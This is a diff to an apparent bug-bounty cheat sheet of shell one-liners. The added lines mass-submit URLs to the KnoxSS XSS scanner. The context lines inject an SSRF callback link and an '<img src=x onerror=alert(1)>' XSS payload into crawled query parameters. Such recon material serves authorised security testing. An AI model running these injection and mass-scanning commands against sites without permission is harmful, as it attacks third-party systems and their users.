@@ -103,6 +103,10 @@ cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c
 ```
 ----------------
 ## XSS:
+### Knoxss mass hunting
+```
+file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
+```
 ```
 cat domains.txt | <gau/katana/hakrawler/waybackurls> | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
 ```
